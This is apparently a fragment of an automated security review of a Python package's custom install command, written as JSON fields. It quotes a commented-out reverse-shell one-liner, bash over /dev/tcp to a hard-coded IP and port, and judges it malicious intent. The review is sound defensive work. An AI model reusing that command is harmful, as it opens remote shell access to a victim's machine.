  "flows": "The code reads directory contents and potentially could feed untrusted data into system commands if modified.",
  "anomalies": "Commented-out potentially malicious code: os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\"). The active code only lists root directory contents, which is benign, but the commented code indicates potential for remote command execution.",
  "analysis": "The script defines a custom install command that executes 'ls /' during installation and prints the output. There is commented code that, if activated, would establish a reverse shell connection to a remote IP, which is malicious behavior. Currently, the active code is benign, but the presence of the commented reverse shell indicates possible malicious intent if uncommented. No other suspicious behavior or hardcoded credentials are present.",
  "conclusion": "The code itself does not execute malicious actions in its current state. However, it contains commented code that could enable a reverse shell, indicating potential malicious intent if modified. The active code is benign, but the presence of such commented code warrants caution.",
